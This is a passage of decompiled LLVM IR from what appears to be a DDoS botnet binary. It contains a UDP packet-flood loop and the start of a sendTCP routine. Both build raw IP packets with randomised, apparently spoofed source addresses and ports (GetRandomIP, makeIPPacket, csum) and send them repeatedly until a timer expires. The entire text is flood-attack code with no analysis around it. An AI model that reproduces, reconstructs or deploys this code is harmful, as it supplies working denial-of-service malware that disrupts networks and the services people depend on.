  %v1_e4ac = add i32 %v3_e498, 34
  %v3_e4b0 = and i32 %v1_e4ac, -4
  %v1_e4b8 = load i32, i32* @sp, align 4
  %v2_e4b8 = sub i32 %v1_e4b8, %v3_e4b0
  %v1_e4c8 = add i32 %v2_e4b8, 11
  %v3_e4cc = and i32 %v1_e4c8, -4
  store i32 %v3_e4cc, i32* %r2.global-to-local, align 4
  %v1_e4ec = add i32 %v3_e4cc, 20
  store i32 %v1_e4ec, i32* %r3.global-to-local, align 4
  %v5_e4f0 = inttoptr i32 %v1_e4ec to i8*
  %v3_e4f4 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_e4f4, i32* @r4, align 4
  %v1_e4fc = call i32 @GetRandomIP(i32 %storemerge12)
  store i32 %v1_e4fc, i32* %r3.global-to-local, align 4
  %v1_e508 = call i32 @htonl(i32 %v1_e4fc)
  store i32 %v1_e508, i32* %r2.global-to-local, align 4
  %v3_e510 = load i32, i32* %stack_var_0, align 4
  %v1_e514 = add i32 %v3_e510, 8
  %v1_e518 = load i32, i32* @sp, align 4
  %v2_e518 = inttoptr i32 %v1_e518 to i32*
  store i32 %v1_e514, i32* %v2_e518, align 4
  %v0_e520 = load i32, i32* @r4, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v4_e528 = inttoptr i32 %v3_e4cc to i8*
  %v5_e528 = call i32 @makeIPPacket(i8* %v4_e528, i32 %v0_e520, i32 %v1_e508, i32 17)
  %v3_e52c = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_e52c, 8
  %v3_e540 = urem i32 %fold, 65536
  store i32 %v3_e540, i32* %r3.global-to-local, align 4
  %v1_e548 = call i32 @htons(i32 %v3_e540)
  %sext = mul i32 %v1_e548, 16777216
  %v1_e54c = sdiv i32 %sext, 16777216
  store i32 %v1_e54c, i32* %r3.global-to-local, align 4
  store i32 %v1_e4ec, i32* %r2.global-to-local, align 4
  %v1_e554 = trunc i32 %v1_e54c to i8
  %v3_e554 = add i32 %v3_e4cc, 24
  %v4_e554 = inttoptr i32 %v3_e554 to i8*
  store i8 %v1_e554, i8* %v4_e554, align 4
  %v0_e558 = load i32, i32* %r3.global-to-local, align 4
  %v3_e558 = sdiv i32 %v0_e558, 256
  store i32 %v3_e558, i32* %r3.global-to-local, align 4
  %v1_e55c = trunc i32 %v3_e558 to i8
  %v2_e55c = load i32, i32* %r2.global-to-local, align 4
  %v3_e55c = add i32 %v2_e55c, 5
  %v4_e55c = inttoptr i32 %v3_e55c to i8*
  store i8 %v1_e55c, i8* %v4_e55c, align 1
  %v0_e560 = call i32 @rand_cmwc()
  %v3_e56c = urem i32 %v0_e560, 65536
  store i32 %v3_e56c, i32* %r3.global-to-local, align 4
  store i32 %v1_e4ec, i32* %r2.global-to-local, align 4
  %v1_e574 = trunc i32 %v0_e560 to i8
  store i8 %v1_e574, i8* %v5_e4f0, align 4
  %v0_e578 = load i32, i32* %r3.global-to-local, align 4
  %v3_e57836 = udiv i32 %v0_e578, 256
  %v1_e57c = trunc i32 %v3_e57836 to i8
  %v2_e57c = load i32, i32* %r2.global-to-local, align 4
  %v3_e57c = add i32 %v2_e57c, 1
  %v4_e57c = inttoptr i32 %v3_e57c to i8*
  store i8 %v1_e57c, i8* %v4_e57c, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_e154, label %dec_label_pc_e58c, label %dec_label_pc_e5a4

dec_label_pc_e58c:                                ; preds = %dec_label_pc_e498
  %v0_e58c = call i32 @rand_cmwc()
  %v3_e594 = mul i32 %v0_e58c, 65536
  store i32 %v3_e594, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v0_e58c to i8
  br label %dec_label_pc_e5c0

dec_label_pc_e5a4:                                ; preds = %dec_label_pc_e498
  %v3_e5ac = urem i32 %arg2, 65536
  store i32 %v3_e5ac, i32* %r3.global-to-local, align 4
  %v1_e5b4 = call i32 @htons(i32 %v3_e5ac)
  %extract.t102 = trunc i32 %v1_e5b4 to i8
  br label %dec_label_pc_e5c0

dec_label_pc_e5c0:                                ; preds = %dec_label_pc_e58c, %dec_label_pc_e5a4
  %v0_e58c.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_e58c ], [ %extract.t102, %dec_label_pc_e5a4 ]
  %v3_e6d8.pre-phi = phi i32 [ 0, %dec_label_pc_e58c ], [ %v3_e5ac, %dec_label_pc_e5a4 ]
  store i32 %v1_e4ec, i32* %r2.global-to-local, align 4
  %v4_e5c4 = sext i8 %v0_e58c.sink.off0 to i32
  %v3_e5c8 = add i32 %v3_e4cc, 22
  %v4_e5c8 = inttoptr i32 %v3_e5c8 to i8*
  store i8 %v0_e58c.sink.off0, i8* %v4_e5c8, align 2
  %v3_e5d040 = udiv i32 %v4_e5c4, 256
  %v1_e5d4 = trunc i32 %v3_e5d040 to i8
  %v2_e5d4 = load i32, i32* %r2.global-to-local, align 4
  %v3_e5d4 = add i32 %v2_e5d4, 3
  %v4_e5d4 = inttoptr i32 %v3_e5d4 to i8*
  store i8 %v1_e5d4, i8* %v4_e5d4, align 1
  store i32 %v1_e4ec, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_e5e0 = add i32 %v3_e4cc, 26
  %v4_e5e0 = inttoptr i32 %v3_e5e0 to i8*
  store i8 0, i8* %v4_e5e0, align 2
  %v0_e5e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_e5e4 = trunc i32 %v0_e5e4 to i8
  %v2_e5e4 = load i32, i32* %r2.global-to-local, align 4
  %v3_e5e4 = add i32 %v2_e5e4, 7
  %v4_e5e4 = inttoptr i32 %v3_e5e4 to i8*
  store i8 %v1_e5e4, i8* %v4_e5e4, align 1
  %v1_e5ec = add i32 %v3_e4cc, 28
  store i32 %v1_e5ec, i32* %r3.global-to-local, align 4
  %v3_e5f4 = load i32, i32* %stack_var_0, align 4
  %v2_e5f8 = call i32 @makeRandomStr(i32 %v1_e5ec, i32 %v3_e5f4)
  %v1_e608 = or i32 %v3_e4cc, 2
  store i32 %v1_e608, i32* %r3.global-to-local, align 4
  %v1_e60c = inttoptr i32 %v1_e608 to i8*
  %v2_e60c = load i8, i8* %v1_e60c, align 2
  %v3_e60c = zext i8 %v2_e60c to i32
  store i32 %v3_e60c, i32* %r2.global-to-local, align 4
  %v1_e610 = or i32 %v1_e4c8, 3
  %v2_e610 = inttoptr i32 %v1_e610 to i8*
  %v3_e610 = load i8, i8* %v2_e610, align 1
  %v4_e610 = zext i8 %v3_e610 to i32
  %v4_e614 = mul nuw nsw i32 %v4_e610, 256
  %v5_e614 = or i32 %v4_e614, %v3_e60c
  store i32 %v5_e614, i32* %r3.global-to-local, align 4
  %v3_e620 = call i32 @csum(i8* %v4_e528, i32 %v5_e614)
  %sext6 = mul i32 %v3_e620, 16777216
  %v1_e624 = sdiv i32 %sext6, 16777216
  store i32 %v1_e624, i32* %r3.global-to-local, align 4
  store i32 %v3_e4cc, i32* %r2.global-to-local, align 4
  %v1_e62c = trunc i32 %v1_e624 to i8
  %v3_e62c = add i32 %v3_e4cc, 10
  %v4_e62c = inttoptr i32 %v3_e62c to i8*
  store i8 %v1_e62c, i8* %v4_e62c, align 2
  %v0_e630 = load i32, i32* %r3.global-to-local, align 4
  %v3_e630 = sdiv i32 %v0_e630, 256
  store i32 %v3_e630, i32* %r3.global-to-local, align 4
  %v1_e634 = trunc i32 %v3_e630 to i8
  %v2_e634 = load i32, i32* %r2.global-to-local, align 4
  %v3_e634 = add i32 %v2_e634, 11
  %v4_e634 = inttoptr i32 %v3_e634 to i8*
  store i8 %v1_e634, i8* %v4_e634, align 1
  %v2_e63c = call i32 @__GI_time(i32* null)
  %v2_e648 = add i32 %v2_e63c, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_e718 = add i32 %v3_e4cc, 4
  %v4_e718 = inttoptr i32 %v3_e718 to i8*
  %v2_e740 = add i32 %v3_e4cc, 12
  %v3_e740 = inttoptr i32 %v2_e740 to i32*
  %v3_e7d8 = mul i32 %arg8, 4
  %v3_e7e8 = mul i32 %arg8, 1000
  br label %dec_label_pc_e664.outer

dec_label_pc_e664.outer:                          ; preds = %dec_label_pc_e800, %dec_label_pc_e7d0, %dec_label_pc_e5c0
  %stack_var_-104.0.ph = phi i32 [ 0, %dec_label_pc_e5c0 ], [ %v1_e7b8, %dec_label_pc_e7d0 ], [ %v1_e7b8, %dec_label_pc_e800 ]
  %stack_var_-100.0.ph = phi i32 [ 0, %dec_label_pc_e5c0 ], [ 0, %dec_label_pc_e7d0 ], [ %v1_e804, %dec_label_pc_e800 ]
  br label %dec_label_pc_e664

dec_label_pc_e664:                                ; preds = %dec_label_pc_e664.outer, %dec_label_pc_e7a8
  %stack_var_-104.0 = phi i32 [ 0, %dec_label_pc_e7a8 ], [ %stack_var_-104.0.ph, %dec_label_pc_e664.outer ]
  store i32 %v3_e4cc, i32* %r2.global-to-local, align 4
  %v1_e66c = load i32, i32* @sp, align 4
  %v2_e66c = inttoptr i32 %v1_e66c to i32*
  store i32 %v2_e1c0, i32* %v2_e66c, align 4
  %v1_e674 = load i32, i32* @sp, align 4
  %v2_e674 = add i32 %v1_e674, 4
  %v3_e674 = inttoptr i32 %v2_e674 to i32*
  store i32 16, i32* %v3_e674, align 4
  %v0_e67c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_e49c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_e688 = inttoptr i32 %v0_e67c to i32*
  %v7_e688 = call i32 @__libc_sendto(i32 %v0_e394, i32* %v6_e688, i32 %v1_e49c, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_e68c = call i32 @rand_cmwc()
  %v3_e698 = urem i32 %v0_e68c, 65536
  store i32 %v3_e698, i32* %r3.global-to-local, align 4
  store i32 %v1_e4ec, i32* %r2.global-to-local, align 4
  %v1_e6a0 = trunc i32 %v0_e68c to i8
  store i8 %v1_e6a0, i8* %v5_e4f0, align 4
  %v0_e6a4 = load i32, i32* %r3.global-to-local, align 4
  %v3_e6a441 = udiv i32 %v0_e6a4, 256
  %v1_e6a8 = trunc i32 %v3_e6a441 to i8
  %v2_e6a8 = load i32, i32* %r2.global-to-local, align 4
  %v3_e6a8 = add i32 %v2_e6a8, 1
  %v4_e6a8 = inttoptr i32 %v3_e6a8 to i8*
  store i8 %v1_e6a8, i8* %v4_e6a8, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_e154, label %dec_label_pc_e6b8, label %dec_label_pc_e6d0

dec_label_pc_e6b8:                                ; preds = %dec_label_pc_e664
  %v0_e6b8 = call i32 @rand_cmwc()
  %v3_e6c0 = mul i32 %v0_e6b8, 65536
  store i32 %v3_e6c0, i32* %r3.global-to-local, align 4
  %extract.t103 = trunc i32 %v0_e6b8 to i8
  br label %dec_label_pc_e6ec

dec_label_pc_e6d0:                                ; preds = %dec_label_pc_e664
  store i32 %v3_e6d8.pre-phi, i32* %r3.global-to-local, align 4
  %v1_e6e0 = call i32 @htons(i32 %v3_e6d8.pre-phi)
  %extract.t104 = trunc i32 %v1_e6e0 to i8
  br label %dec_label_pc_e6ec

dec_label_pc_e6ec:                                ; preds = %dec_label_pc_e6b8, %dec_label_pc_e6d0
  %v0_e6b8.sink.off0 = phi i8 [ %extract.t103, %dec_label_pc_e6b8 ], [ %extract.t104, %dec_label_pc_e6d0 ]
  store i32 %v1_e4ec, i32* %r2.global-to-local, align 4
  %v4_e6f0 = sext i8 %v0_e6b8.sink.off0 to i32
  store i8 %v0_e6b8.sink.off0, i8* %v4_e5c8, align 2
  %v3_e6fc = sdiv i32 %v4_e6f0, 256
  store i32 %v3_e6fc, i32* %r3.global-to-local, align 4
  %v1_e700 = trunc i32 %v3_e6fc to i8
  %v2_e700 = load i32, i32* %r2.global-to-local, align 4
  %v3_e700 = add i32 %v2_e700, 3
  %v4_e700 = inttoptr i32 %v3_e700 to i8*
  store i8 %v1_e700, i8* %v4_e700, align 1
  %v0_e704 = call i32 @rand_cmwc()
  %v3_e710 = urem i32 %v0_e704, 65536
  store i32 %v3_e710, i32* %r3.global-to-local, align 4
  store i32 %v3_e4cc, i32* %r2.global-to-local, align 4
  %v1_e718 = trunc i32 %v0_e704 to i8
  store i8 %v1_e718, i8* %v4_e718, align 4
  %v0_e71c = load i32, i32* %r3.global-to-local, align 4
  %v3_e71c = sdiv i32 %v0_e71c, 256
  store i32 %v3_e71c, i32* %r3.global-to-local, align 4
  %v1_e720 = trunc i32 %v3_e71c to i8
  %v2_e720 = load i32, i32* %r2.global-to-local, align 4
  %v3_e720 = add i32 %v2_e720, 5
  %v4_e720 = inttoptr i32 %v3_e720 to i8*
  store i8 %v1_e720, i8* %v4_e720, align 1
  %v1_e728 = call i32 @GetRandomIP(i32 %storemerge12)
  store i32 %v1_e728, i32* %r3.global-to-local, align 4
  %v1_e734 = call i32 @htonl(i32 %v1_e728)
  store i32 %v1_e734, i32* %r2.global-to-local, align 4
  store i32 %v1_e734, i32* %v3_e740, align 4
  store i32 %v1_e608, i32* %r3.global-to-local, align 4
  %v2_e754 = load i8, i8* %v1_e60c, align 2
  %v3_e754 = zext i8 %v2_e754 to i32
  store i32 %v3_e754, i32* %r2.global-to-local, align 4
  %v3_e758 = load i8, i8* %v2_e610, align 1
  %v4_e758 = zext i8 %v3_e758 to i32
  %v4_e75c = mul nuw nsw i32 %v4_e758, 256
  %v5_e75c = or i32 %v4_e75c, %v3_e754
  store i32 %v5_e75c, i32* %r3.global-to-local, align 4
  %v3_e768 = call i32 @csum(i8* %v4_e528, i32 %v5_e75c)
  %sext7 = mul i32 %v3_e768, 16777216
  %v1_e76c = sdiv i32 %sext7, 16777216
  store i32 %v1_e76c, i32* %r3.global-to-local, align 4
  store i32 %v3_e4cc, i32* %r2.global-to-local, align 4
  %v1_e774 = trunc i32 %v1_e76c to i8
  store i8 %v1_e774, i8* %v4_e62c, align 2
  %v0_e778 = load i32, i32* %r3.global-to-local, align 4
  %v3_e77845 = udiv i32 %v0_e778, 256
  %v1_e77c = trunc i32 %v3_e77845 to i8
  %v2_e77c = load i32, i32* %r2.global-to-local, align 4
  %v3_e77c = add i32 %v2_e77c, 11
  %v4_e77c = inttoptr i32 %v3_e77c to i8*
  store i8 %v1_e77c, i8* %v4_e77c, align 1
  store i32 %stack_var_-104.0, i32* %r2.global-to-local, align 4
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v9_e788 = icmp eq i32 %stack_var_-104.0, %arg6
  br i1 %v9_e788, label %dec_label_pc_e790, label %dec_label_pc_e7b4

dec_label_pc_e790:                                ; preds = %dec_label_pc_e6ec
  %v2_e794 = call i32 @__GI_time(i32* null)
  store i32 %v2_e794, i32* %r2.global-to-local, align 4
  store i32 %v2_e648, i32* %r3.global-to-local, align 4
  %v8_e7a4 = icmp sgt i32 %v2_e794, %v2_e648
  br i1 %v8_e7a4, label %dec_label_pc_e810, label %dec_label_pc_e7a8

dec_label_pc_e7a8:                                ; preds = %dec_label_pc_e790
  br label %dec_label_pc_e664

dec_label_pc_e7b4:                                ; preds = %dec_label_pc_e6ec
  %v1_e7b8 = add i32 %stack_var_-104.0, 1
  store i32 %v1_e7b8, i32* %r2.global-to-local, align 4
  store i32 %arg7, i32* %r3.global-to-local, align 4
  %v9_e7c8 = icmp eq i32 %stack_var_-100.0.ph, %arg7
  br i1 %v9_e7c8, label %dec_label_pc_e7d0, label %dec_label_pc_e800

dec_label_pc_e7d0:                                ; preds = %dec_label_pc_e7b4
  store i32 %v3_e7d8, i32* %r2.global-to-local, align 4
  store i32 %v3_e7e8, i32* %r3.global-to-local, align 4
  %v1_e7f0 = call i32 @usleep(i32 %v3_e7e8)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e664.outer

dec_label_pc_e800:                                ; preds = %dec_label_pc_e7b4
  %v1_e804 = add i32 %stack_var_-100.0.ph, 1
  store i32 %v1_e804, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e664.outer

dec_label_pc_e810:                                ; preds = %dec_label_pc_e790, %dec_label_pc_e3f8, %dec_label_pc_e3ac
  %v12_e81833 = phi i32 [ %v3_e408, %dec_label_pc_e3f8 ], [ %v3_e3bc, %dec_label_pc_e3ac ], [ %v2_e794, %dec_label_pc_e790 ]
  br label %dec_label_pc_e814

dec_label_pc_e814:                                ; preds = %dec_label_pc_e300, %dec_label_pc_e1a0, %dec_label_pc_e228, %dec_label_pc_e210, %dec_label_pc_e810
  %v12_e818 = phi i32 [ %v3_e1b0, %dec_label_pc_e1a0 ], [ 0, %dec_label_pc_e228 ], [ %v3_e220, %dec_label_pc_e210 ], [ %v12_e81833, %dec_label_pc_e810 ], [ %v2_e304, %dec_label_pc_e300 ]
  store i32 %v3_e124, i32* @r4, align 4
  store i32 %v6_e124, i32* @fp, align 4
  ret i32 %v12_e818

; uselistorder directives
  uselistorder i32 %v1_e804, { 1, 0 }
  uselistorder i32 %v1_e7b8, { 2, 1, 0 }
  uselistorder i32 %v1_e76c, { 1, 0 }
  uselistorder i32 %v3_e71c, { 1, 0 }
  uselistorder i32 %v0_e704, { 1, 0 }
  uselistorder i32 %v3_e6fc, { 1, 0 }
  uselistorder i8 %v0_e6b8.sink.off0, { 1, 0 }
  uselistorder i32 %v0_e6b8, { 1, 0 }
  uselistorder i32 %v0_e68c, { 1, 0 }
  uselistorder i32 %stack_var_-104.0, { 0, 2, 1 }
  uselistorder i32 %v3_e7e8, { 1, 0 }
  uselistorder i32 %v2_e648, { 1, 0 }
  uselistorder i32 %v3_e630, { 1, 0 }
  uselistorder i32 %v1_e624, { 1, 0 }
  uselistorder i32 %v1_e608, { 0, 2, 1 }
  uselistorder i32 %v3_e6d8.pre-phi, { 1, 0 }
  uselistorder i8 %v0_e58c.sink.off0, { 1, 0 }
  uselistorder i32 %v3_e5ac, { 2, 1, 0 }
  uselistorder i32 %v0_e58c, { 1, 0 }
  uselistorder i32 %v0_e560, { 1, 0 }
  uselistorder i32 %v3_e558, { 1, 0 }
  uselistorder i32 %v1_e54c, { 1, 0 }
  uselistorder i32 %v3_e540, { 1, 0 }
  uselistorder i32 %v3_e4cc, { 9, 7, 5, 8, 6, 3, 4, 14, 13, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v1_e49c, { 1, 0 }
  uselistorder i32 %v1_e454, { 1, 0 }
  uselistorder i32 %v1_e328, { 1, 0 }
  uselistorder i32 %v3_e2a0, { 1, 0 }
  uselistorder i32 %stack_var_-108.0.ph, { 1, 2, 0 }
  uselistorder i32 %v3_e358, { 1, 0 }
  uselistorder i32 %v2_e284, { 1, 0 }
  uselistorder i32 %v1_e234, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v2_e1c0, { 1, 0, 2 }
  uselistorder i32 %v3_e184, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-80, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 8, 9, 6, 7, 13, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 25, 26, 23, 24, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 38, 36, 39, 41, 40, 42, 43, 47, 44, 45, 46, 74, 48, 50, 49, 51, 52, 53, 55, 54, 56, 58, 57, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 70, 69, 71, 72, 73, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 0 }
  uselistorder i32 26, { 0, 2, 1 }
  uselistorder i32 (i32)* @usleep, { 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 1, 0 }
  uselistorder i32 %arg8, { 3, 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 3, 0, 2 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder i32 %arg4, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %arg2, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder label %dec_label_pc_e814, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_e6ec, { 1, 0 }
  uselistorder label %dec_label_pc_e664, { 1, 0 }
  uselistorder label %dec_label_pc_e5c0, { 1, 0 }
  uselistorder label %dec_label_pc_e498, { 1, 0 }
  uselistorder label %dec_label_pc_e41c, { 1, 0 }
  uselistorder label %dec_label_pc_e300, { 1, 0 }
  uselistorder label %dec_label_pc_e2a0, { 1, 0 }
  uselistorder label %dec_label_pc_e1a0, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_e82c = load i32, i32* @r4, align 4
  %v6_e82c = load i32, i32* @fp, align 4
  store i32 59444, i32* %stack_var_-4, align 4
  %v2_e830 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e830, i32* @fp, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_e86c = icmp eq i32 %arg2, 0
  br i1 %v2_e86c, label %dec_label_pc_e874, label %dec_label_pc_e894

dec_label_pc_e874:                                ; preds = %entry
  %v0_e874 = call i32 @rand_cmwc()
  %v3_e87c = mul i32 %v0_e874, 65536
  store i32 %v3_e87c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e8b8

dec_label_pc_e894:                                ; preds = %entry
  %v3_e89c = urem i32 %arg2, 65536
  store i32 %v3_e89c, i32* %r3.global-to-local, align 4
  %v1_e8a4 = call i32 @htons(i32 %v3_e89c)
  br label %dec_label_pc_e8b8

dec_label_pc_e8b8:                                ; preds = %dec_label_pc_e874, %dec_label_pc_e894
  %v2_e8bc = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_e8bc, i32* %r3.global-to-local, align 4
  %v3_e8c8 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-60)
  store i32 %v3_e8c8, i32* %r3.global-to-local, align 4
  %v2_e8d0 = icmp eq i32 %v3_e8c8, 0
  br i1 %v2_e8d0, label %dec_label_pc_e8dc, label %dec_label_pc_eeb4

dec_label_pc_e8dc:                                ; preds = %dec_label_pc_e8b8
  %v2_e8dc = ptrtoint i32* %stack_var_-64 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 6, i32* @r2, align 4
  %v0_e900 = call i32 @socket()
  store i32 %v0_e900, i32* %r3.global-to-local, align 4
  %v2_e910 = icmp eq i32 %v0_e900, 0
  br i1 %v2_e910, label %dec_label_pc_e918, label %dec_label_pc_e930

dec_label_pc_e918:                                ; preds = %dec_label_pc_e8dc
  %v2_e91c = load i32, i32* @global_var_2d604.55, align 4
  store i32 %v2_e91c, i32* %r3.global-to-local, align 4
  %v3_e928 = call i32 @sockprintf(i32 %v2_e91c, i32 ptrtoint ([27 x i8]* @global_var_1bc4c.396 to i32))
  br label %dec_label_pc_eeb4

dec_label_pc_e930:                                ; preds = %dec_label_pc_e8dc
  store i32 1, i32* %stack_var_-68, align 4
  %v2_e938 = ptrtoint i32* %stack_var_-68 to i32
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_e938, i32* %r3.global-to-local, align 4
  %v6_e954 = call i32 @__GI_setsockopt(i32 %v0_e900, i32 0, i32 3, i32* nonnull %stack_var_-68, i32 4)
  store i32 %v6_e954, i32* %r3.global-to-local, align 4
  %v1_e95c = icmp slt i32 %v6_e954, 0
  br i1 %v1_e95c, label %dec_label_pc_e964, label %dec_label_pc_e97c

dec_label_pc_e964:                                ; preds = %dec_label_pc_e930
  %v2_e968 = load i32, i32* @global_var_2d604.55, align 4
  store i32 %v2_e968, i32* %r3.global-to-local, align 4
  %v3_e974 = call i32 @sockprintf(i32 %v2_e968, i32 ptrtoint ([33 x i8]* @global_var_1bc68.398 to i32))
  br label %dec_label_pc_eeb4

dec_label_pc_e97c:                                ; preds = %dec_label_pc_e930
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v2_e980 = icmp eq i32 %arg4, 0
  br i1 %v2_e980, label %dec_label_pc_e9ac, label %dec_label_pc_e994

dec_label_pc_e994:                                ; preds = %dec_label_pc_e97c
  %v1_e998 = sub i32 32, %arg4
  store i32 %v1_e998, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_e9a4 = shl i32 -1, %v1_e998
  br label %dec_label_pc_e9ac

dec_label_pc_e9ac:                                ; preds = %dec_label_pc_e97c, %dec_label_pc_e994
  %storemerge10 = phi i32 [ %v1_e9a4, %dec_label_pc_e994 ], [ 0, %dec_label_pc_e97c ]
  %v1_e9b0 = add i32 %arg6, 40
  %v1_e9c0 = add i32 %arg6, 46
  %v3_e9c4 = and i32 %v1_e9c0, -4
  %v1_e9cc = load i32, i32* @sp, align 4
  %v2_e9cc = sub i32 %v1_e9cc, %v3_e9c4
  %v1_e9dc = add i32 %v2_e9cc, 11
  %v3_e9e0 = and i32 %v1_e9dc, -4
  store i32 %v3_e9e0, i32* %r2.global-to-local, align 4
  %v1_ea00 = add i32 %v3_e9e0, 20
  store i32 %v1_ea00, i32* %r3.global-to-local, align 4
  %v5_ea04 = inttoptr i32 %v1_ea00 to i8*
  %v3_ea08 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_ea08, i32* @r4, align 4
  %v1_ea10 = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_ea10, i32* %r3.global-to-local, align 4
  %v1_ea1c = call i32 @htonl(i32 %v1_ea10)
  store i32 %v1_ea1c, i32* %r2.global-to-local, align 4
  %v1_ea28 = add i32 %arg6, 20
  %v1_ea2c = load i32, i32* @sp, align 4
  %v2_ea2c = inttoptr i32 %v1_ea2c to i32*
  store i32 %v1_ea28, i32* %v2_ea2c, align 4
  %v0_ea34 = load i32, i32* @r4, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v4_ea3c = inttoptr i32 %v3_e9e0 to i8*
  %v5_ea3c = call i32 @makeIPPacket(i8* %v4_ea3c, i32 %v0_ea34, i32 %v1_ea1c, i32 6)
  %v0_ea40 = call i32 @rand_cmwc()
  %v3_ea4c = urem i32 %v0_ea40, 65536
  store i32 %v3_ea4c, i32* %r3.global-to-local, align 4
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v1_ea54 = trunc i32 %v0_ea40 to i8
  store i8 %v1_ea54, i8* %v5_ea04, align 4
  %v0_ea58 = load i32, i32* %r3.global-to-local, align 4
  %v3_ea58 = sdiv i32 %v0_ea58, 256
  store i32 %v3_ea58, i32* %r3.global-to-local, align 4
  %v1_ea5c = trunc i32 %v3_ea58 to i8
  %v2_ea5c = load i32, i32* %r2.global-to-local, align 4
  %v3_ea5c = add i32 %v2_ea5c, 1
  %v4_ea5c = inttoptr i32 %v3_ea5c to i8*
  store i8 %v1_ea5c, i8* %v4_ea5c, align 1
  %v0_ea60 = call i32 @rand_cmwc()
  %v2_ea6c = add i32 %v3_e9e0, 24
  %v3_ea6c = inttoptr i32 %v2_ea6c to i32*
  store i32 %v0_ea60, i32* %v3_ea6c, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ea78 = add i32 %v3_e9e0, 28
  %v3_ea78 = inttoptr i32 %v2_ea78 to i32*
  store i32 0, i32* %v3_ea78, align 4
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v1_ea80 = add i32 %v3_e9e0, 32
  %v2_ea80 = inttoptr i32 %v1_ea80 to i8*
  %v3_ea80 = load i8, i8* %v2_ea80, align 4
  %v1_ea8c = urem i8 %v3_ea80, 16
  %v1_ea90 = or i8 %v1_ea8c, 80
  store i8 %v1_ea90, i8* %v2_ea80, align 4
  %v3_eaa0 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_eaa0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1bc8c.403 to i32), i32* @r1, align 4
  %v3_eaac = inttoptr i32 %v3_eaa0 to i8*
  %v4_eaac = call i32 @__GI_strcoll(i8* %v3_eaac, i32 ptrtoint ([4 x i8]* @global_var_1bc8c.403 to i32))
  store i32 %v4_eaac, i32* %r3.global-to-local, align 4
  %v2_eab4 = icmp eq i32 %v4_eaac, 0
  br i1 %v2_eab4, label %dec_label_pc_eabc, label %dec_label_pc_eb10

dec_label_pc_eabc:                                ; preds = %dec_label_pc_e9ac
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v1_eac0 = add i32 %v3_e9e0, 33
  %v2_eac0 = inttoptr i32 %v1_eac0 to i8*
  %v3_eac0 = load i8, i8* %v2_eac0, align 1
  %v4_eac0 = zext i8 %v3_eac0 to i32
  %v1_eac4 = or i32 %v4_eac0, 2
